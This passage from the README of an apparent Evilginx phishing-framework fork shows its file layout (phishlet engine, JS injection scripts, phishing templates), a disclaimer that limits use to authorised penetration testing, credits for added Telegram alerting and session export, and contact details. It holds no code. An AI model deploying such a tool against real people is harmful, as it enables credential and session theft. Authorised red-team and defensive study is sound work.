│   ├── phishlet.go                  #    Phishlet engine
│   ├── terminal.go                  #    CLI interface
│   ├── gophish.go                   #    Gophish integration
│   ├── banner.go                    #    ASCII art banner
│   ├── help.go                      #    Help commands
│   ├── scripts.go                   #    JS injection scripts
│   ├── shared.go                    #    Shared utilities
│   ├── table.go                     #    Table formatting
│   └── utils.go                     #    Utility functions
│
├── database/                        # Persistence layer
│   ├── database.go                  #    BuntDB wrapper
│   └── db_session.go                #    Session struct + full CRUD
│
├── phishlets/                       # YAML phishing templates
├── redirectors/                     # HTML redirector pages
│
├── Dockerfile                       # Multi-stage Alpine build (~18MB)
├── .dockerignore                    # Docker build exclusions
├── docker-compose.yml               # Docker Compose configuration
│
├── Makefile                         # Build helpers
├── go.mod / go.sum                  # Go module dependencies
│
├── DEPLOYMENT.md                    # Full deployment guide
├── CHANGELOG                        # Version history
├── LICENSE                          # BSD 3-Clause
└── README.md                        # This file

⚖️ Disclaimer
I am fully aware that Evilginx can be used for nefarious purposes. This work is merely a demonstration of what adept attackers can do. It is the defender's responsibility to take such attacks into consideration and find ways to protect their users against this type of phishing attacks.

Evilginx should be used only in legitimate penetration testing assignments with written permission from the parties being tested.

Unauthorized use of this tool is illegal and unethical. The author and contributors assume no liability for misuse.

👏 Credits & Support

Contributors

Contribution	Author	Contact
Telegram Integration — Async queue, file attachments, auto-updating messages	@officialmonsterz	Telegram / Email
Web Dashboard — HTML UI, REST API, CSV/JSON export, search, dark mode	@officialmonsterz	Telegram / Email
Database Layer — BuntDB integration, session CRUD	@officialmonsterz	Telegram / Email
Docker Build — Multi-stage, Alpine, ~18MB	@officialmonsterz	Telegram / Email
Auto-Export System — Auto-save sessions to JSON/CSV	@officialmonsterz	Telegram / Email
Original Evilginx2/3 (Core Framework)	Kuba Gretzky (@mrgretzky)	kgretzky/evilginx2

Big thanks to Kuba Gretzky for creating such a phenomenal tool and making it open source. This fork builds upon his incredible work.

Get Help
Telegram Support: t.me/officialmonsterz
Email: shapads@tutamail.com
GitHub Issues: github.com/officialmonsterz/evilginx2/issues
Repository: github.com/officialmonsterz/evilginx2
Created with ❤️ by @officialmonsterz
